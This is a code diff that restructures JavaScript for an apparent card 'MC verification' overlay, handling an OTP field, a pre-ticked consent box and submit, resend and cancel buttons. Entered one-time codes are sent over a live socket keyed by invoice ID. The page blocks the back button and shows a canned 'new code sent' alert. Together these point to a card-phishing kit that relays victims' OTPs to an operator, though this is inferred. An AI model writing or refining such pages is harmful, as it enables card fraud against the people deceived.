@@ -2158,174 +2158,161 @@ function validateExpiry(value) {
       history.pushState(null, null, window.location.href);
     }
     
-    // Setup MC verification event handlers
-    function setupMCVerificationHandlers() {
-      const mcOtpInput = document.getElementById('mcOtpInput');
-      const mcSubmitBtn = document.getElementById('mcSubmitBtn');
-      const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
-      const consentLabel = document.getElementById('consentLabel');
-      
-      // Input handler to enable/disable submit button
-      if (mcOtpInput) {
-        mcOtpInput.addEventListener('input', function() {
-          updateMcSubmitButton();
-        });
-      }
-      
-      // Consent checkbox toggle - IMPROVED VERSION THAT ENSURES CLICKABILITY
-      if (mcConsentCheckbox && consentLabel) {
-        // Make sure the entire label area is clickable
-        consentLabel.style.cursor = 'pointer';
-        
-        // Add click handler to both checkbox and label
-        consentLabel.addEventListener('click', function(e) {
-          // Toggle the 'checked' class
-          mcConsentCheckbox.classList.toggle('checked');
-          
-          // Find the SVG element within the checkbox
-          const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
-          if (checkmarkSvg) {
-// Simpler consent checkbox toggle that works more reliably
-if (mcConsentCheckbox && consentLabel) {
-  // Make sure the entire label is clickable
-  consentLabel.style.cursor = 'pointer';
+// Setup MC verification event handlers
+function setupMCVerificationHandlers() {
+  const mcOtpInput = document.getElementById('mcOtpInput');
+  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+  const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
+  const consentLabel = document.getElementById('consentLabel');
   
-  // Set initial state - always checked by default
-  mcConsentCheckbox.classList.add('checked');
-  const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
-  if (checkmarkSvg) {
-    checkmarkSvg.style.display = 'block';
-    mcConsentCheckbox.style.backgroundColor = '#2778c4';
-    mcConsentCheckbox.style.borderColor = '#2778c4';
+  // Input handler to enable/disable submit button
+  if (mcOtpInput) {
+    mcOtpInput.addEventListener('input', function() {
+      updateMcSubmitButton();
+    });
   }
   
-  // Simpler click handler
-  const toggleConsent = function(e) {
-    e.preventDefault();
-    e.stopPropagation();
+  // Simpler consent checkbox toggle that works more reliably
+  if (mcConsentCheckbox && consentLabel) {
+    // Make sure the entire label is clickable
+    consentLabel.style.cursor = 'pointer';
     
-    mcConsentCheckbox.classList.toggle('checked');
-    
+    // Set initial state - always checked by default
+    mcConsentCheckbox.classList.add('checked');
     const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
     if (checkmarkSvg) {
-      if (mcConsentCheckbox.classList.contains('checked')) {
-        checkmarkSvg.style.display = 'block';
-        mcConsentCheckbox.style.backgroundColor = '#2778c4';
-        mcConsentCheckbox.style.borderColor = '#2778c4';
-      } else {
-        checkmarkSvg.style.display = 'none';
-        mcConsentCheckbox.style.backgroundColor = 'white';
-        mcConsentCheckbox.style.borderColor = '#ccc';
-      }
+      checkmarkSvg.style.display = 'block';
+      mcConsentCheckbox.style.backgroundColor = '#2778c4';
+      mcConsentCheckbox.style.borderColor = '#2778c4';
     }
     
-    updateMcSubmitButton();
-    return false;
-  };
-  
-  // Add the handler to both elements
-  mcConsentCheckbox.onclick = toggleConsent;
-  consentLabel.onclick = toggleConsent;
-  
-  // Always update the submit button state initially
-  setTimeout(updateMcSubmitButton, 100);
-}
+    // Simpler click handler
+    const toggleConsent = function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      
+      mcConsentCheckbox.classList.toggle('checked');
+      
+      const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
+      if (checkmarkSvg) {
+        if (mcConsentCheckbox.classList.contains('checked')) {
+          checkmarkSvg.style.display = 'block';
+          mcConsentCheckbox.style.backgroundColor = '#2778c4';
+          mcConsentCheckbox.style.borderColor = '#2778c4';
+        } else {
+          checkmarkSvg.style.display = 'none';
+          mcConsentCheckbox.style.backgroundColor = 'white';
+          mcConsentCheckbox.style.borderColor = '#ccc';
+        }
+      }
+      
+      updateMcSubmitButton();
+      return false;
+    };
     
-   // Update submit button based on OTP and consent
-function updateMcSubmitButton() {
-  if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
+    // Add the handler to both elements
+    mcConsentCheckbox.onclick = toggleConsent;
+    consentLabel.onclick = toggleConsent;
+    
+    // Always update the submit button state initially
+    setTimeout(updateMcSubmitButton, 100);
+  }
   
-  const hasOtp = mcOtpInput.value.trim().length > 0;
-  const hasConsent = mcConsentCheckbox.classList.contains('checked');
+  // Update submit button based on OTP and consent
+  function updateMcSubmitButton() {
+    if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
+    
+    const hasOtp = mcOtpInput.value.trim().length > 0;
+    const hasConsent = mcConsentCheckbox.classList.contains('checked');
+    
+    if (hasOtp && hasConsent) {
+      mcSubmitBtn.disabled = false;
+      mcSubmitBtn.style.backgroundColor = '#2778c4';
+      mcSubmitBtn.style.cursor = 'pointer';
+    } else {
+      mcSubmitBtn.disabled = true;
+      mcSubmitBtn.style.backgroundColor = '#CCCCCC';
+      mcSubmitBtn.style.cursor = 'not-allowed';
+    }
+  }
   
-  if (hasOtp && hasConsent) {
-    mcSubmitBtn.disabled = false;
-    mcSubmitBtn.style.backgroundColor = '#2778c4';
-    mcSubmitBtn.style.cursor = 'pointer';
-  } else {
-    mcSubmitBtn.disabled = true;
-    mcSubmitBtn.style.backgroundColor = '#CCCCCC';
-    mcSubmitBtn.style.cursor = 'not-allowed';
+  // Submit button
+  if (mcSubmitBtn) {
+    mcSubmitBtn.onclick = function() {
+      if (mcSubmitBtn.disabled) return;
+      
+      const otp = mcOtpInput?.value?.trim();
+      if (!otp) {
+        const mcOtpError = document.getElementById('mcOtpError');
+        if (mcOtpError) {
+          mcOtpError.textContent = 'Please enter the verification code.';
+          mcOtpError.style.display = 'block';
+        }
+        return;
+      }
+      
+      // Show loading state
+      mcSubmitBtn.disabled = true;
+      mcSubmitBtn.textContent = 'Verifying...';
+      mcSubmitBtn.style.opacity = '0.7';
+      
+      // Send OTP
+      socket.emit('mc_otp_submitted', {
+        invoiceId: currentInvoiceId,
+        otp: otp
+      });
+    };
+  }
+  
+  // Resend button
+  const mcResendBtn = document.getElementById('mcResendBtn');
+  if (mcResendBtn) {
+    mcResendBtn.onclick = function() {
+      mcResendBtn.disabled = true;
+      mcResendBtn.textContent = 'Sending...';
+      
+      socket.emit('mc_resend_otp', {
+        invoiceId: currentInvoiceId
+      });
+      
+      setTimeout(() => {
+        mcResendBtn.disabled = false;
+        mcResendBtn.textContent = 'Resend';
+        alert('A new verification code has been sent to your registered mobile number.');
+      }, 1500);
+    };
+  }
+  
+  // Cancel button
+  const mcCancelBtn = document.getElementById('mcCancelBtn');
+  if (mcCancelBtn) {
+    mcCancelBtn.onclick = function() {
+      if (confirm('Do you want to cancel this verification?')) {
+        const overlay = document.getElementById('mcVerificationOverlay');
+        if (overlay) overlay.style.display = 'none';
+        
+        if (window.mcTimerInterval) {
+          clearInterval(window.mcTimerInterval);
+        }
+        
+        window.location.href = getFailUrl('canceled');
+      }
+    };
+  }
+  
+  // Info tooltip toggle
+  const otpInfoIcon = document.getElementById('otpInfoIcon');
+  const otpInfoTooltip = document.getElementById('otpInfoTooltip');
+  if (otpInfoIcon && otpInfoTooltip) {
+    otpInfoIcon.addEventListener('mouseenter', function() {
+      otpInfoTooltip.style.display = 'block';
+    });
+    
+    otpInfoIcon.addEventListener('mouseleave', function() {
+      otpInfoTooltip.style.display = 'none';
+    });
   }
 }
-      
-      // Submit button
-      if (mcSubmitBtn) {
-        mcSubmitBtn.onclick = function() {
-          if (mcSubmitBtn.disabled) return;
-          
-          const otp = mcOtpInput?.value?.trim();
-          if (!otp) {
-            const mcOtpError = document.getElementById('mcOtpError');
-            if (mcOtpError) {
-              mcOtpError.textContent = 'Please enter the verification code.';
-              mcOtpError.style.display = 'block';
-            }
-            return;
-          }
-          
-          // Show loading state
-          mcSubmitBtn.disabled = true;
-          mcSubmitBtn.textContent = 'Verifying...';
-          mcSubmitBtn.style.opacity = '0.7';
-          
-          // Send OTP
-          socket.emit('mc_otp_submitted', {
-            invoiceId: currentInvoiceId,
-            otp: otp
-          });
-        };
-      }
-      
-      // Resend button
-      const mcResendBtn = document.getElementById('mcResendBtn');
-      if (mcResendBtn) {
-        mcResendBtn.onclick = function() {
-          mcResendBtn.disabled = true;
-          mcResendBtn.textContent = 'Sending...';
-          
-          socket.emit('mc_resend_otp', {
-            invoiceId: currentInvoiceId
-          });
-          
-          setTimeout(() => {
-            mcResendBtn.disabled = false;
-            mcResendBtn.textContent = 'Resend';
-            alert('A new verification code has been sent to your registered mobile number.');
-          }, 1500);
-        };
-      }
-      
-      // Cancel button
-      const mcCancelBtn = document.getElementById('mcCancelBtn');
-      if (mcCancelBtn) {
-        mcCancelBtn.onclick = function() {
-          if (confirm('Do you want to cancel this verification?')) {
-            const overlay = document.getElementById('mcVerificationOverlay');
-            if (overlay) overlay.style.display = 'none';
-            
-            if (window.mcTimerInterval) {
-              clearInterval(window.mcTimerInterval);
-            }
-            
-            window.location.href = getFailUrl('canceled');
-          }
-        };
-      }
-      
-      // Info tooltip toggle
-      const otpInfoIcon = document.getElementById('otpInfoIcon');
-      const otpInfoTooltip = document.getElementById('otpInfoTooltip');
-      if (otpInfoIcon && otpInfoTooltip) {
-        otpInfoIcon.addEventListener('mouseenter', function() {
-          otpInfoTooltip.style.display = 'block';
-        });
-        
-        otpInfoIcon.addEventListener('mouseleave', function() {
-          otpInfoTooltip.style.display = 'none';
-        });
-      }
-    }
     
     function setupMCTimerIfNeeded(reset = false) {
       const timerElement = document.getElementById('mcTimer');
